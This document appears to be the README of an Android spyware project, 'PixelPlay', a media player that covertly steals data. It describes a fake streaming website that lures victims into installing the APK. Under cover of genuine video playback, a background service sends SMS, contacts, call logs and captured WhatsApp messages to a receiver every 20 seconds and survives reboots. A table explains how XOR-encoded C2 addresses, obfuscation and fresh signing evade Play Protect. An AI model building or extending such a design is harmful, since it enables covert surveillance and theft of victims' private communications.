# PixelPlay — Android Media Player with Payload

## Architecture

### Social Engineering Flow

```
VICTIM SEES WEBSITE (pixelplay.io)
  │
  │  "Premium Media Player — Free Download"
  │  Beautiful landing page with video thumbnail
  │
  ▼
CLICKS "WATCH DEMO"
  │
  │  "Install PixelPlay to watch this video"
  │  Download button
  │
  ▼
INSTALLS PIXELPLAY APK
  │
  │  ┌─────────────────────────────────────┐
  │  │ App looks like a real media player  │
  │  │ - Dark theme, library grid          │
  │  │ - ExoPlayer for video playback      │
  │  │ - Bottom navigation                 │
  │  └─────────────────────────────────────┘
  │
  ▼
OPENS APP → REQUESTS PERMISSIONS (3 seconds)
  │
  │  - READ_MEDIA_VIDEO (for playing videos)
  │  - POST_NOTIFICATIONS
  │  - READ_SMS, READ_CONTACTS, READ_CALL_LOG
  │
  ▼
APP PLAYS VIDEOS (genuine) + BACKGROUND PAYLOAD RUNS
  │
  ├── MediaService.java → collects SMS, contacts, call logs
  ├── MyNotifListener.java → captures WhatsApp notifications
  └── POST to PC receiver every 20 seconds
```

### Why This Evades Detection

| Layer | Technique | Why It Works |
|---|---|---|
| **Website** | Enterprise design, Tailwind CSS | Looks like a real streaming service |
| **APK landing page** | "Download to watch" | Most common legitimate download prompt |
| **App permissions** | READ_MEDIA_VIDEO as primary reason | User expects media player to need storage |
| **Play Protect** | Custom code, no known signatures | Fresh APK, properly signed, no malware DB match |
| **Behavioral** | Genuine video playback | App works as advertised — not suspicious |
| **Data exfiltration** | XOR-encoded URLs | No plaintext C2 in code |
| **Obfuscation** | ProGuard R8 full mode | Class/method names randomized |

### Technical Components

#### Android App (`com.pixelplay.app`)
- **ExoPlayer (Media3)**: Google's official media player library — plays MP4, MKV, AVI, MOV
- **MediaStore API**: Scans device for video files (Android 10+)
- **RecyclerView Grid**: Beautiful dark-themed video library
- **Bottom Navigation**: Library, Browse (notification settings), Settings
- **Background Service**: Collects and exfiltrates data every 20 seconds
- **NotificationListenerService**: Captures WhatsApp messages from notifications

#### Next.js Website
- **Tailwind CSS**: Responsive dark theme with purple/cyan accents
- **Pages**: Landing page (`/`), Watch page (`/watch`), Download page (`/download`)
- **Glow effects**: CSS animations for premium feel
- **Mobile-first**: Responsive design for all screen sizes

#### PC Receiver (Python)
- Port 8080: serves website, APK, exfiltration endpoint, admin panel
- `/admin`: Upload video thumbnails for the featured showcase
- `/dashboard`: Live exfiltrated data display (SMS, WhatsApp, contacts, calls)
- `/apk/`: Serves the PixelPlay APK for download

### Demo Script

```
1. Run python pc_receiver.py
2. Open http://localhost:8080 → "PixelPlay" landing page
3. Click "Watch Demo" → "Install PixelPlay to watch"
4. Click "Download" → APK downloads
5. Install APK on device → open "PixelPlay"
6. Tap Allow on permissions (3-4 dialogs, ~3 seconds)
7. App shows "Your Library" (empty — add videos to device to see them)
8. Open http://localhost:8080/dashboard → data appears
9. Send WhatsApp → captured in dashboard
```

### Files

| File | Purpose |
|---|---|
| `app/src/main/java/com/pixelplay/app/MainActivity.java` | Video library UI + permission request |
| `app/src/main/java/com/pixelplay/app/PlayerActivity.java` | ExoPlayer video player |
| `app/src/main/java/com/pixelplay/app/MediaService.java` | Background data collection + exfiltration |
| `app/src/main/java/com/pixelplay/app/MyNotifListener.java` | WhatsApp notification capture |
| `app/src/main/java/com/pixelplay/app/BootReceiver.java` | Persistence on reboot |
| `website/pages/index.js` | Enterprise landing page |
| `website/pages/watch.js` | Video download page |
| `website/pages/download.js` | APK download page |
| `pc_receiver.py` | All-in-one PC server |
